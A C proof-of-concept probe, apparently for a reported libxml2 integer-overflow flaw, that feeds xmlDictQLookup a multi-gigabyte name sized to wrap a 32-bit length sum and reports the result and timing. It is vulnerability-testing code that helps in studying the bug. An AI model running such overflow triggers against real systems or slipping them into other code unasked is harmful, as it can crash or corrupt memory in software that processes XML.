/*
 * Real-library probe for CVE-2026-86138 (W237).
 *
 * Calls the public libxml2 v2.15.3 dictionary API with a QName whose local
 * part has the length that would wrap xmlDictAddQString()'s 32-bit sum.
 * The name is an anonymous mapping filled with 'a' so strlen-style hashing
 * traverses the whole length; the terminating NUL is the last byte.
 *
 * Modes: safe (16), over (INT_MAX/2+2), wrap (0xfffffff0).
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <sys/mman.h>
#include <limits.h>
#include <libxml/parser.h>
#include <libxml/dict.h>

int main(int argc, char **argv) {
    const char *mode = (argc > 1) ? argv[1] : "safe";
    size_t namelen;
    const char *prefix = "abcdefghijklmno";
    unsigned char *name;
    xmlDict *dict;
    const xmlChar *ret;
    struct timespec t0, t1;
    double secs;

    if (strcmp(mode, "over") == 0)
        namelen = (size_t) INT_MAX / 2 + 2;
    else if (strcmp(mode, "wrap") == 0)
        namelen = 0xfffffff0UL;
    else {
        mode = "safe";
        namelen = 16;
    }

    name = mmap(NULL, namelen + 1, PROT_READ | PROT_WRITE,
                MAP_PRIVATE | MAP_ANONYMOUS | MAP_NORESERVE, -1, 0);
    if (name == MAP_FAILED) { perror("mmap"); return 2; }
    memset(name, 'a', namelen);
    name[namelen] = 0;
    if (mprotect(name, namelen + 1, PROT_READ) != 0) {
        perror("mprotect"); return 2;
    }

    dict = xmlDictCreate();
    if (dict == NULL) { fprintf(stderr, "xmlDictCreate failed\n"); return 2; }
    clock_gettime(CLOCK_MONOTONIC, &t0);
    ret = xmlDictQLookup(dict, BAD_CAST prefix, name);
    clock_gettime(CLOCK_MONOTONIC, &t1);
    secs = (double)(t1.tv_sec - t0.tv_sec) + 1e-9 * (double)(t1.tv_nsec - t0.tv_nsec);
    printf("MODE=%s PREFIX_LEN=%zu NAME_LEN=%zu WRAP32=%u RET=%s SECS=%.3f DICT_SIZE=%zu\n",
           mode, strlen(prefix), namelen,
           (unsigned)(namelen + strlen(prefix) + 1),
           ret == NULL ? "NULL" : "non-NULL", secs, (size_t) xmlDictSize(dict));
    fflush(stdout);
    xmlDictFree(dict);
    munmap(name, namelen + 1);
    return 0;
}
